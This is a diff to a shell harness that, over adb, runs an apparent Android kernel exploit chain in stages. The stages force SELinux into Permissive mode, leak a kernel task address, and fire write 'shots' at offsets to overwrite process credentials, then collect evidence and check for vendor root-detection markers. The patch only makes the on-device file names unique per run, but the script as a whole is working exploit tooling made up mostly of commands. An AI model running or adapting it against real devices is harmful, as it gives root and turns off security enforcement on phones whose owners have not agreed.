@@ -38,11 +38,17 @@ export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"
 ADB=${ADB:-adb}
 SER=${SER:-$( "$ADB" devices 2>/dev/null | sed -n "2s/[[:space:]].*//p" )}
 DEV=/data/local/tmp
-BIN=$DEV/glxA            # LT + W1
-BINW=$DEV/glxW           # W7 only
-EV=$DEV/bootA_ev.txt
-TASKF=$DEV/bootA_task.txt
-RES=$DEV/bootA_res.txt
+# A run-unique tag on EVERY device-side path.  After one of these events the
+# files in /data/local/tmp can become root-owned and un-statable for shell
+# (`adb push` then fails with "stat failed ... Permission denied", `rm`/`mv`
+# fail too), so reusing a fixed name poisons the next run.  Same reason the
+# per-shot evidence path below is unique.
+TAG=${TAG:-$(date +%m%d_%H%M%S)}
+BIN=$DEV/glxA_$TAG       # LT + W1
+BINW=$DEV/glxW_$TAG      # W7 only
+EV=$DEV/bootA_ev_$TAG.txt
+TASKF=$DEV/bootA_task_$TAG.txt
+RES=$DEV/bootA_res_$TAG.txt
 OUT=${OUT:-./bootA_$(date +%m%d_%H%M%S)}
 HOLD=${HOLD:-20}
 CHAINWAIT=${CHAINWAIT:-4000}
@@ -73,11 +79,11 @@ A "chmod 755 $BIN $BINW"
 # ---------------------------------------------------------------- 1. Permissive
 say "=== step 1: SELinux Permissive ==="
 if [ "$(A 'getenforce' | tr -d '\r')" = "Permissive" ]; then
-    say "  already Permissive — skipping W1 entirely (no timeout 190 ./glxA W1)"
+    say "  already Permissive — skipping W1 entirely (no timeout 190 ./$(basename $BIN) W1)"
 else
     W1OK=0
     for r in 1 2 3 4 5 6 7 8; do
-        A "cd $DEV && V12B_EVIDENCE=$DEV/bootA_w1_ev.txt timeout 190 ./glxA W1 >/dev/null 2>&1"
+        A "cd $DEV && V12B_EVIDENCE=$DEV/bootA_w1_ev_$TAG.txt timeout 190 ./$(basename $BIN) W1 >/dev/null 2>&1"
         EN=$(A 'getenforce' | tr -d '\r')
         say "  W1 round $r: $EN"
         [ "$EN" = "Permissive" ] && { W1OK=1; break; }
@@ -109,17 +115,17 @@ done
 say "=== step 4: LT child (pure userspace spin, NO_EXEC) ==="
 TASK=""; CPID=""; PPID_LT=""
 for attempt in 1 2 3 4; do
-    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev.txt V12_NO_EXEC=1 ./glxA LT > $DEV/bootA_lt.log 2>&1 </dev/null &"
+    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev.txt V12_NO_EXEC=1 ./$(basename $BIN) LT > $DEV/bootA_lt_$TAG.log 2>&1 </dev/null &"
     for i in $(seq 1 25); do
         sleep 1
         TASK=$(A "cat $TASKF 2>/dev/null" | tr -d '\r\n')
         [ -n "$TASK" ] && break
     done
     [ -n "$TASK" ] && break
-    say "  LT attempt $attempt rejected: $(A "grep -m1 suspicious $DEV/bootA_lt.log 2>/dev/null" | tr -d '\r')"
+    say "  LT attempt $attempt rejected: $(A "grep -m1 suspicious $DEV/bootA_lt_$TAG.log 2>/dev/null" | tr -d '\r')"
 done
 [ -z "$TASK" ] && { say "!! no task leak — stopping"; exit 3; }
-LTLOG=$(A "cat $DEV/bootA_lt.log 2>/dev/null")
+LTLOG=$(A "cat $DEV/bootA_lt_$TAG.log 2>/dev/null")
 CPID=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT child_task = 0x[0-9a-f]* pid=\([0-9]*\).*/\1/p' | head -1)
 PPID_LT=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT parent pid=\([0-9]*\) child=.*/\1/p' | head -1)
 say "  task=$TASK child_pid=$CPID lt_parent=$PPID_LT"
@@ -135,10 +141,10 @@ shot() {  # $1=off $2=extra $3=tag -> echoes the write value it used
     # fails (a previous event can leave /data/local/tmp files root-owned and
     # un-statable for shell), the poll reads the PREVIOUS shot's output and
     # breaks immediately with the wrong content.
-    local ev="$DEV/bootA_ev_$tag.txt"
+    local ev="$DEV/bootA_ev_${TAG}_$tag.txt"
     A "rm -f $ev 2>/dev/null; true"
     say "  [$tag] firing ONE shot: off=$off chainwait=${CHAINWAIT}ms hold=${HOLD}s ${extra:-}"
-    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=1 $extra V12B_EVIDENCE=$ev ./glxW W7 > $DEV/w7_$tag.log 2>&1 </dev/null &"
+    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_CHAIN_WAIT_MS=$CHAINWAIT V12_HOLD_SEC=$HOLD V12_PIN_FORK=1 V12_NODRAIN=1 $extra V12B_EVIDENCE=$ev ./$(basename $BINW) W7 > $DEV/w7_${TAG}_$tag.log 2>&1 </dev/null &"
     local i out=""
     for i in $(seq 1 15); do            # capped at 15 s, not 90
         sleep 1
@@ -256,7 +262,7 @@ say "  --- guard markers, for completeness ---"
 grep -aE 'ROOTCHECK|oplus_root|sys_call_number|path@@|execve_' "$KLOG" | tail -20 > "$OUT/10_rootcheck.txt"
 if [ -s "$OUT/10_rootcheck.txt" ]; then sed 's/^/    /' "$OUT/10_rootcheck.txt"; else say "    (none)"; fi
 A "getprop ro.boot.bootreason; getenforce; uptime; grep -c '^kernelsu' /proc/modules 2>/dev/null" | tee "$OUT/10_final.txt"
-for f in bootA_lt.log bootA_lt_ev.txt bootA_w1_ev.txt; do
+for f in bootA_lt_$TAG.log bootA_lt_ev.txt bootA_w1_ev_$TAG.txt; do
     A "cat $DEV/$f 2>/dev/null" | tr -d '\r' > "$OUT/$f"
 done
 say "evidence -> $OUT"
